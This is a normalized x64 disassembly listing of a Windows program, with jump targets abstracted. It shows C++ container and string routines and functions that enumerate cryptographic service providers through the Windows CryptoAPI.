mov r12 0x2aaaaaaaaaaaaaab
mov rax r12
imul rcx
sar rdx 0x3
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor ebx ebx
mov [ rsp + 0x58 ] rbx
test rdi rdi
je r-xdata
mov r8 rbx
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_140002890
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x3
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
lea rcx [ rdi + rdi * 2 ]
shl rcx 0x4
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ rdi + rdi * 2 ]
shl rax 0x4
add rax rbx
mov [ rsi + 0x10 ] rax
lea rax [ r12 + r12 * 2 ]
shl rax 0x4
add rax rbx
mov [ rsi + 0x8 ] rax
mov [ rsi ] rbx
mov rdx r9
call sub_140002400
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_140002400
cmp rcx rdx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rsi
mov rdi rdx
mov rbx rcx
xor esi esi
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
add rbx 0x30
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
sub_140002460
push r12
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x60 ] rsi
mov [ rsp + 0x68 ] rdi
mov rdi rdx
mov rsi rcx
mov rax 0x666666666666666
cmp rdx rax
jbe r-xdata
mov rcx [ rcx + 0x10 ]
sub rcx [ rsi ]
mov r12 0x6666666666666667
mov rax r12
imul rcx
sar rdx 0x4
mov rax rdx
shr rax 0x3f
add rdx rax
cmp rdx rdi
jae r-xdata
lea rcx [ r--data ]
call sub_1400378ec
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
xor ebx ebx
mov [ rsp + 0x58 ] rbx
test rdi rdi
je r-xdata
mov r8 rbx
mov rdx [ rsi + 0x8 ]
mov rcx [ rsi ]
call sub_140002910
nop
mov r9 [ rsi + 0x8 ]
mov rcx [ rsi ]
mov r8 r9
sub r8 rcx
mov rax r12
imul r8
mov r12 rdx
sar r12 0x4
mov rax r12
shr rax 0x3f
add r12 rax
test rcx rcx
je r-xdata
lea rcx [ rdi + rdi * 4 ]
shl rcx 0x3
call sub_14003ac60
mov rbx rax
mov [ rsp + 0x58 ] rax
test rax rax
jne r-xdata
lea rax [ rdi + rdi * 4 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x10 ] rcx
lea rax [ r12 + r12 * 4 ]
lea rcx [ rbx + rax * 8 ]
mov [ rsi + 0x8 ] rcx
mov [ rsi ] rbx
mov rdx r9
call sub_1400026f0
mov rcx [ rsi ]
call j_sub_14003ad04
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
sub_1400025a0
mov [ rsp + 0x18 ] r8
mov [ rsp + 0x10 ] rdx
mov [ rsp + 0x8 ] rcx
push rbx
push rsi
push rdi
push r12
push r13
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov r13 r8
mov rbx rcx
mov rdi rdx
or rdi 0x7
mov r9 0x7ffffffffffffffe
cmp rdi r9
jbe r-xdata
mov r8 [ rcx + 0x18 ]
mov rcx r8
shr rcx 0x1
mov rax 0xaaaaaaaaaaaaaaab
mul rdi
shr rdx 0x1
cmp rcx rdx
jbe r-xdata
mov rdi rdx
jmp r-xdata
lea rcx [ rdi + 0x1 ]
xor r12d r12d
mov esi r12d
test rcx rcx
je r-xdata
mov rax r9
sub rax rcx
cmp r8 rax
lea rdi [ rcx + r8 ]
jbe r-xdata
jmp r-xdata
mov rax 0x7fffffffffffffff
cmp rcx rax
ja r-xdata
mov rdi r9
test r13 r13
je r-xdata
mov [ rsp + 0x88 ] r12
lea rdx [ rsp + 0x88 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea rax [ r--data ]
mov [ rsp + 0x28 ] rax
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
nop
add rcx rcx
call sub_14003ac60
mov rsi rax
test rax rax
jne r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov [ rbx ] rsi
mov [ rbx + 0x18 ] rdi
mov [ rbx + 0x10 ] r13
cmp rdi 0x8
cmovae rbx rsi
mov [ rbx + r13 * 2 ] r12w
add rsp 0x40
pop r13
pop r12
pop rdi
pop rsi
pop rbx
retn
mov rcx [ rbx ]
call j_sub_14003ad04
mov rdx rbx
mov rdx [ rbx ]
jmp r-xdata
lea r8 [ r13 + r13 ]
mov rcx rsi
call sub_14003a8c0
sub_1400026f0
cmp rcx rdx
je r-xdata
retn
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov [ rsp + 0x30 ] rsi
mov rdi rdx
mov rbx rcx
xor esi esi
nop [ rax ] eax
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
add rbx 0x28
cmp rbx rdi
jne r-xdata
mov rcx [ rbx ]
call j_sub_14003ad04
cmp [ rbx + 0x18 ] 0x8
jb r-xdata
mov rsi [ rsp + 0x30 ]
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
sub_140002750
sub rsp 0x48
xor eax eax
test rcx rcx
je r-xdata
add rsp 0x48
retn
mov rax 0x7fffffffffffffff
cmp rcx rax
ja r-xdata
lea rdx [ rsp + 0x50 ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x50 ] 0x0
call sub_14003a774
lea r11 [ r--data ]
lea rdx [ r--data ]
lea rcx [ rsp + 0x20 ]
mov [ rsp + 0x20 ] r11
call sub_14003f22c
int3
add rcx rcx
call sub_14003ac60
test rax rax
jne r-xdata
sub_1400027f0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rdi rdx
mov rbx rcx
cmp rcx rdx
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
cmp [ rcx + 0x18 ] 0x8
mov [ rsp + 0x30 ] rsi
jb r-xdata
xor esi esi
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] rsi
mov [ rbx ] si
cmp [ rdi + 0x18 ] 0x8
jae r-xdata
mov rcx [ rcx ]
call j_sub_14003ad04
mov rax [ rdi ]
mov [ rbx ] rax
mov [ rdi ] rsi
mov r8 [ rdi + 0x10 ]
mov rdx rdi
mov rcx rbx
lea r8 [ r8 + r8 + 0x2 ]
call sub_14003a8c0
jmp r-xdata
mov rax [ rdi + 0x10 ]
mov [ rbx + 0x10 ] rax
mov rax [ rdi + 0x18 ]
mov [ rbx + 0x18 ] rax
mov [ rdi + 0x10 ] rsi
mov [ rdi + 0x18 ] 0x7
mov [ rdi ] si
mov rsi [ rsp + 0x30 ]
sub_140002890
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x30
mov [ rsp + 0x60 ] rbx
add rdi 0x30
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
mov rdx rdi
mov rcx rbx
call sub_1400027f0
mov eax [ rdi + 0x28 ]
mov [ rbx + 0x28 ] eax
cmp rdi rsi
je r-xdata
sub_140002910
mov [ rsp + 0x18 ] r8
push rsi
push rdi
push r12
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x68 ] rbx
mov rbx r8
mov rsi rdx
mov rdi rcx
mov [ rsp + 0x50 ] rbx
xor r12d r12d
nop [ rax ] eax
mov rax rbx
mov rbx [ rsp + 0x68 ]
add rsp 0x30
pop r12
pop rdi
pop rsi
retn
mov [ rsp + 0x58 ] rbx
test rbx rbx
je r-xdata
add rbx 0x28
mov [ rsp + 0x60 ] rbx
add rdi 0x28
jmp r-xdata
mov [ rbx + 0x18 ] 0x7
mov [ rbx + 0x10 ] r12
mov [ rbx ] r12w
mov rdx rdi
mov rcx rbx
call sub_1400027f0
nop
cmp rdi rsi
je r-xdata
sub_140002990
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x40
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x60 ] rbx
mov rdi rdx
mov rbx rcx
xor edx edx
call sub_14003825c
nop
xor eax eax
mov [ rbx + 0x8 ] rax
mov [ rbx + 0x10 ] al
mov [ rbx + 0x18 ] rax
mov [ rbx + 0x20 ] al
mov [ rbx + 0x28 ] rax
mov [ rbx + 0x30 ] al
mov [ rbx + 0x38 ] rax
mov [ rbx + 0x40 ] al
test rdi rdi
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_140038004
nop
mov rax rbx
mov rbx [ rsp + 0x60 ]
add rsp 0x40
pop rdi
retn
lea rax [ r--data ]
mov [ rsp + 0x58 ] rax
lea rdx [ rsp + 0x58 ]
lea rcx [ rsp + 0x28 ]
call sub_14003a774
lea r11 [ r--data ]
mov [ rsp + 0x28 ] r11
lea rdx [ r--data ]
lea rcx [ rsp + 0x28 ]
call sub_14003f22c
int3
sub_140002a30
mov [ rsp + 0x8 ] rcx
push rdi
sub rsp 0x30
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rsp + 0x48 ] rbx
mov rbx rcx
call sub_140037f70
nop
mov rcx [ rbx + 0x38 ]
test rcx rcx
je r-xdata
xor edi edi
mov [ rbx + 0x38 ] rdi
mov rcx [ rbx + 0x28 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rbx + 0x28 ] rdi
mov rcx [ rbx + 0x18 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rbx + 0x18 ] rdi
mov rcx [ rbx + 0x8 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rbx + 0x8 ] rdi
mov rcx rbx
mov rbx [ rsp + 0x48 ]
add rsp 0x30
pop rdi
jmp sub_14003828c
call sub_14003ad04
sub_140002af0
push rbx
sub rsp 0x20
mov rbx [ rcx ]
test rbx rbx
je r-xdata
add rsp 0x20
pop rbx
retn
lea rcx [ rsp + 0x30 ]
xor edx edx
mov [ rsp + 0x38 ] rdi
call sub_14003825c
mov rax [ rbx + 0x8 ]
test rax rax
je r-xdata
xor edi edi
lea rcx [ rsp + 0x30 ]
cmp [ rbx + 0x8 ] rdi
cmove rdi rbx
call sub_14003828c
test rdi rdi
je r-xdata
cmp rax 0xffffffffffffffff
jae r-xdata
mov rdi [ rsp + 0x38 ]
mov rax [ rdi ]
mov edx 0x1
mov rcx rdi
call [ rax ]
dec rax
mov [ rbx + 0x8 ] rax
sub_140002b60
mov rax rsp
push rsi
push rdi
push r12
sub rsp 0x90
mov [ rsp + 0x20 ] 0xfffffffffffffffe
mov [ rax + 0x10 ] rbx
mov [ rax + 0x18 ] rbp
mov rbp rdx
mov rdi rcx
xor r12d r12d
mov esi r12d
mov [ rsp + 0xb0 ] r12d
test rcx rcx
je r-xdata
mov eax 0x2
lea r11 [ rsp + 0x90 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsp r11
pop r12
pop rdi
pop rsi
retn
cmp [ rcx ] rsi
jne r-xdata
lea ecx [ r12 + 0x30 ]
call sub_14003ac60
mov rbx rax
mov [ rsp + 0xb0 ] rax
test rax rax
je r-xdata
mov rbx r12
mov rax [ rbp ]
mov rdx [ rax + 0x28 ]
test rdx rdx
jne r-xdata
lea rcx [ rsp + 0x40 ]
call sub_140037f70
nop
mov rcx [ rsp + 0x78 ]
test rcx rcx
je r-xdata
lea rcx [ rsp + 0x40 ]
call sub_140002990
mov esi 0x1
mov [ rbx + 0x8 ] r12
lea rax [ r--data ]
mov [ rbx ] rax
lea rcx [ rsp + 0x28 ]
call sub_1400388c0
mov rcx [ rax ]
mov [ rbx + 0x10 ] rcx
mov rcx [ rax + 0x8 ]
mov [ rbx + 0x18 ] rcx
mov rax [ rax + 0x10 ]
mov [ rbx + 0x20 ] rax
call sub_140037a98
mov [ rbx + 0x28 ] rax
jmp r-xdata
lea rdx [ rax + 0x30 ]
mov [ rsp + 0x78 ] r12
mov rcx [ rsp + 0x68 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rdi ] rbx
test sil 0x1
je r-xdata
mov [ rsp + 0x68 ] r12
mov rcx [ rsp + 0x58 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x58 ] r12
mov rcx [ rsp + 0x48 ]
test rcx rcx
je r-xdata
call sub_14003ad04
mov [ rsp + 0x48 ] r12
lea rcx [ rsp + 0x40 ]
call sub_14003828c
call sub_14003ad04
sub_140002d00
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rbx r8
movzx ebp dx
mov rsi rcx
cmp r8 r9
je r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
nop [ rax + rax ] ax
add rbx 0x2
cmp rbx rdi
jne r-xdata
mov rax [ rsi ]
movzx r8d [ rbx ]
movzx edx bp
mov rcx rsi
call [ rax + 0x10 ]
test al al
jne r-xdata
sub_140002d70
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi r9
mov rbx r8
movzx ebp dx
mov rsi rcx
cmp r8 r9
je r-xdata
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
nop [ rax + rax ] ax
add rbx 0x2
cmp rbx rdi
jne r-xdata
mov rax [ rsi ]
movzx r8d [ rbx ]
movzx edx bp
mov rcx rsi
call [ rax + 0x10 ]
test al al
je r-xdata
sub_140002df0
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
lea rdi [ rcx + 0x10 ]
nop
movzx ecx [ rbx ]
mov rdx rdi
call sub_140038314
add rbx 0x2
mov [ rbx - 0x2 ] ax
cmp rbx rsi
jne r-xdata
mov rdi [ rsp + 0x30 ]
sub_140002e50
mov [ rsp + 0x10 ] rbx
push rsi
sub rsp 0x20
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rsi
retn
mov [ rsp + 0x30 ] rdi
lea rdi [ rcx + 0x10 ]
nop
movzx ecx [ rbx ]
mov rdx rdi
call sub_140038384
add rbx 0x2
mov [ rbx - 0x2 ] ax
cmp rbx rsi
jne r-xdata
mov rdi [ rsp + 0x30 ]
sub_140002ea0
sub rsp 0x38
lea rax [ rcx + 0x28 ]
mov [ rsp + 0x48 ] dl
lea r9 [ rsp + 0x50 ]
lea rdx [ rsp + 0x48 ]
lea rcx [ rsp + 0x40 ]
mov r8d 0x1
mov [ rsp + 0x20 ] rax
mov [ rsp + 0x50 ] 0x0
call sub_1400385a4
movzx ecx [ rsp + 0x40 ]
test eax eax
mov edx 0xffff
cmovs cx dx
movzx eax cx
add rsp 0x38
retn
sub_140002ef0
push rbx
push rsi
push rdi
sub rsp 0x50
mov rsi r9
mov rdi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
add rsp 0x50
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x70 ] rbp
mov [ rsp + 0x48 ] r12
mov [ rsp + 0x40 ] r13
mov r13d 0xffff
lea rbp [ rcx + 0x28 ]
xor r12d r12d
movzx eax [ rbx ]
lea r9 [ rsp + 0x30 ]
lea rdx [ rsp + 0x78 ]
lea rcx [ rsp + 0x80 ]
mov r8d 0x1
mov [ rsp + 0x30 ] r12d
mov [ rsp + 0x78 ] al
mov [ rsp + 0x20 ] rbp
call sub_1400385a4
movzx ecx [ rsp + 0x80 ]
test eax eax
cmovs cx r13w
inc rbx
add rsi 0x2
mov [ rsi - 0x2 ] cx
cmp rbx rdi
jne r-xdata
mov r13 [ rsp + 0x40 ]
mov r12 [ rsp + 0x48 ]
mov rbp [ rsp + 0x70 ]
sub_140002f90
push rbx
sub rsp 0x40
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
movzx ebx r8b
lea r9 [ rcx + 0x28 ]
lea r8 [ rsp + 0x20 ]
lea rcx [ rsp + 0x24 ]
mov [ rsp + 0x20 ] 0x0
call sub_1400379dc
movzx edx [ rsp + 0x24 ]
cmp eax 0x1
cmovne edx ebx
movzx eax dl
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x40
pop rbx
retn
sub_140002ff0
push rbx
push rsi
push rdi
push r12
sub rsp 0x48
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x30 ] rax
mov rdi [ rsp + 0x90 ]
movzx r12d r9b
mov rsi r8
mov rbx rdx
cmp rdx r8
je r-xdata
mov rax rbx
mov rcx [ rsp + 0x30 ]
xor rcx rsp
call sub_14003a6a0
add rsp 0x48
pop r12
pop rdi
pop rsi
pop rbx
retn
mov [ rsp + 0x80 ] rbp
mov [ rsp + 0x40 ] r13
xor r13d r13d
lea rbp [ rcx + 0x28 ]
nop [ rax + rax ] ax
movzx edx [ rbx ]
lea r8 [ rsp + 0x20 ]
lea rcx [ rsp + 0x24 ]
mov r9 rbp
mov [ rsp + 0x20 ] r13d
call sub_1400379dc
movzx edx [ rsp + 0x24 ]
movzx ecx r12b
cmp eax 0x1
cmovne edx ecx
add rbx 0x2
inc rdi
mov [ rdi - 0x1 ] dl
cmp rbx rsi
jne r-xdata
mov r13 [ rsp + 0x40 ]
mov rbp [ rsp + 0x80 ]
sub_1400030a0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
cmp [ rcx + 0x20 ] 0x0
lea rax [ r--data ]
mov edi edx
mov [ rcx ] rax
mov rbx rcx
je r-xdata
lea rax [ r--data ]
mov [ rbx ] rax
test dil 0x1
je r-xdata
mov rcx [ rcx + 0x18 ]
call sub_14003ad04
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rbx
call j_sub_14003ad04
sub_1400030f0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov ebx edx
mov rdi rcx
call sub_14003a7e8
test bl 0x1
je r-xdata
mov rax rdi
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov rcx rdi
call j_sub_14003ad04
sub_140003120
push rbp
mov rbp rsp
sub rsp 0x60
mov eax [ rcx + 0x14 ]
and edx 0x17
and eax edx
mov [ rcx + 0x10 ] edx
je r-xdata
add rsp 0x60
pop rbp
retn
test r8b r8b
je r-xdata
mov [ rsp + 0x78 ] rbx
mov [ rbp - 0x40 ] 0x1
test al 0x4
je r-xdata
xor edx edx
xor ecx ecx
call sub_14003f22c
int3
test al 0x2
je r-xdata
call sub_140037b24
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x30 ]
mov rbx rax
lea rax [ r--data ]
mov [ rbp + 0x10 ] rax
call sub_14003a774
mov rcx [ rbp - 0x40 ]
mov [ rbp - 0x18 ] rcx
lea rax [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x30 ] rax
call sub_14003f22c
int3
call sub_140037b24
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x30 ]
mov rbx rax
lea rax [ r--data ]
mov [ rbp + 0x10 ] rax
call sub_14003a774
mov rcx [ rbp - 0x40 ]
mov [ rbp - 0x18 ] rcx
lea rax [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x30 ] rax
call sub_14003f22c
int3
call sub_140037b24
lea rdx [ rbp + 0x10 ]
lea rcx [ rbp - 0x30 ]
mov rbx rax
lea rax [ r--data ]
mov [ rbp + 0x10 ] rax
call sub_14003a774
mov rcx [ rbp - 0x40 ]
mov [ rbp - 0x18 ] rcx
lea rax [ r--data ]
lea rdx [ r--data ]
lea rcx [ rbp - 0x30 ]
mov [ rbp - 0x10 ] rbx
mov [ rbp - 0x30 ] rax
call sub_14003f22c
int3
sub_140003240
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rax [ rcx + 0x40 ]
mov rbx rdx
lea rcx [ rsp + 0x30 ]
mov rdi [ rax ]
mov [ rdx ] rdi
xor edx edx
call sub_14003825c
mov rax [ rdi + 0x8 ]
cmp rax 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x30 ]
call sub_14003828c
mov rax rbx
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
inc rax
mov [ rdi + 0x8 ] rax
sub_140003290
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
xor esi esi
xor r8d r8d
xor edx edx
mov rbx rcx
mov [ rcx + 0x18 ] 0x201
mov [ rcx + 0x20 ] 0x6
mov [ rcx + 0x40 ] rsi
mov [ rcx + 0x8 ] rsi
mov [ rcx + 0x14 ] esi
mov [ rcx + 0x28 ] rsi
mov [ rcx + 0x30 ] rsi
mov [ rcx + 0x38 ] rsi
call sub_140003120
lea ecx [ rsi + 0x8 ]
call sub_14003ac60
mov rdi rax
test rax rax
je r-xdata
mov [ rbx + 0x40 ] rsi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
call sub_1400380d8
mov [ rdi ] rax
call sub_140037e88
lea rcx [ rsp + 0x30 ]
xor edx edx
mov rsi rax
call sub_14003825c
mov rcx [ rsi + 0x8 ]
cmp rcx 0xffffffffffffffff
jae r-xdata
lea rcx [ rsp + 0x30 ]
call sub_14003828c
mov [ rbx + 0x40 ] rdi
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
inc rcx
mov [ rsi + 0x8 ] rcx
sub_140003360
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_14003a824
lea r11 [ r--data ]
mov [ rdi ] r11
mov rax [ rbx + 0x18 ]
mov [ rdi + 0x18 ] rax
mov rax [ rbx + 0x20 ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x20 ] rax
lea rax [ r--data ]
mov [ rdi ] rax
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_1400033b0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rdx
mov rdi rcx
call sub_14003a824
lea r11 [ r--data ]
mov [ rdi ] r11
mov rax [ rbx + 0x18 ]
mov [ rdi + 0x18 ] rax
mov rax [ rbx + 0x20 ]
mov rbx [ rsp + 0x30 ]
mov [ rdi + 0x20 ] rax
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_1400033f0
mov r11 rsp
push rdi
push r12
push r13
sub rsp 0x70
mov [ rsp + 0x38 ] 0xfffffffffffffffe
mov [ r11 + 0x10 ] rbx
mov [ r11 + 0x18 ] rbp
mov [ r11 + 0x20 ] rsi
mov rax [ rw-data ]
xor rax rsp
mov [ rsp + 0x68 ] rax
mov r12 rcx
xor ebx ebx
mov esi ebx
lea rax [ r11 - 0x58 ]
mov [ r11 - 0x60 ] rax
mov [ r11 - 0x68 ] rbx
lea r9 [ r11 - 0x54 ]
xor r8d r8d
xor edx edx
xor ecx ecx
call [ CryptEnumProvidersW@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x103
sete al
mov rcx [ rsp + 0x68 ]
xor rcx rsp
call sub_14003a6a0
lea r11 [ rsp + 0x70 ]
mov rbx [ r11 + 0x28 ]
mov rbp [ r11 + 0x30 ]
mov rsi [ r11 + 0x38 ]
mov rsp r11
pop r13
pop r12
pop rdi
retn
or r13 0xffffffffffffffff
mov rcx rbp
call j_sub_14003ad04#2
inc esi
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rbx
lea r9 [ rsp + 0x34 ]
xor r8d r8d
xor edx edx
mov ecx esi
call [ CryptEnumProvidersW@IAT ]
test eax eax
jne r-xdata
mov [ rsp + 0x58 ] 0x7
mov [ rsp + 0x50 ] rbx
mov [ rsp + 0x40 ] bx
xor eax eax
mov rcx r13
mov rdi rbp
[ rdi ]
not rcx
lea r8 [ rcx - 0x1 ]
mov rdx rbp
lea rcx [ rsp + 0x40 ]
call sub_140001ea0
nop
lea rdx [ rsp + 0x40 ]
mov rcx r12
call sub_140003b30
nop
cmp [ rsp + 0x58 ] 0x8
jb r-xdata
mov ecx [ rsp + 0x30 ]
mov eax 0x2
mul rcx
cmovo rax r13
mov rcx rax
call j_sub_14003ac60
mov rbp rax
lea rax [ rsp + 0x30 ]
mov [ rsp + 0x28 ] rax
mov [ rsp + 0x20 ] rbp
lea r9 [ rsp + 0x34 ]
xor r8d r8d
xor edx edx
mov ecx esi
call [ CryptEnumProvidersW@IAT ]
test eax eax
je r-xdata
mov rcx [ rsp + 0x40 ]
call j_sub_14003ad04
sub_140003550
push rbp
push rsi
push rdi
push r12
push r13
push r14
push r15
lea rbp [ rsp - 0x90 ]
sub rsp 0x190
mov [ rsp + 0x48 ] 0xfffffffffffffffe
mov [ rsp + 0x1e0 ] rbx
mov rax [ rw-data ]
xor rax rsp
mov [ rbp + 0x80 ] rax
mov r13 rcx
xor r14d r14d
mov edi r14d
mov [ rsp + 0x40 ] r14d
mov [ rsp + 0x38 ] r14
neg dl
sbb eax eax
and eax 0x20
or eax 0xf0000000
mov [ rsp + 0x20 ] eax
mov ebx 0x1
mov r9d ebx
xor r8d r8d
xor edx edx
lea rcx [ rsp + 0x38 ]
call [ CryptAcquireContextW@IAT ]
test eax eax
je r-xdata
xor al al
mov [ rsp + 0x30 ] r14d
mov [ rsp + 0x20 ] ebx
lea r9 [ rsp + 0x30 ]
xor r8d r8d
lea edx [ rbx + 0x1 ]
mov rcx [ rsp + 0x38 ]
call [ CryptGetProvParam@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x103
sete bl
xor edx edx
mov rcx [ rsp + 0x38 ]
call [ CryptReleaseContext@IAT ]
movzx eax bl
jmp r-xdata
lea r15 [ r--data ]
nop
mov rcx [ rbp + 0x80 ]
xor rcx rsp
call sub_14003a6a0
mov rbx [ rsp + 0x1e0 ]
add rsp 0x190
pop r15
pop r14
pop r13
pop r12
pop rdi
pop rsi
pop rbp
retn
mov rcx rsi
call j_sub_14003ad04#2
mov ebx 0x2
test r12b r12b
jne r-xdata
lea rax [ r--data ]
mov [ rsp + 0x50 ] rax
lea rax [ r--data ]
mov [ rsp + 0x60 ] rax
or edi 0x1
mov [ rsp + 0x40 ] edi
lea rax [ r--data ]
mov [ rbp - 0x18 ] rax
mov [ rsp + 0x58 ] r14
lea rcx [ rbp - 0x18 ]
call sub_140003290
lea r11 [ rsp + 0x68 ]
mov [ rbp + 0x30 ] r11
mov [ rbp + 0x38 ] r14
mov dl 0x20
lea rcx [ rbp - 0x18 ]
call sub_140004ce0
mov [ rbp + 0x40 ] ax
cmp [ rbp + 0x30 ] 0x0
jne r-xdata
mov ecx [ rsp + 0x30 ]
call j_sub_14003ac60
mov rsi rax
mov [ rsp + 0x20 ] ebx
lea r9 [ rsp + 0x30 ]
mov r8 rax
mov edx 0x2
mov rcx [ rsp + 0x38 ]
call [ CryptGetProvParam@IAT ]
test eax eax
setne r12b
test r12b r12b
je r-xdata
mov rax [ rsp + 0x60 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
mov [ rsp + rcx + 0x60 ] rax
mov rax [ rsp + 0x50 ]
movsxd rcx [ rax + 0x4 ]
lea rax [ r--data ]
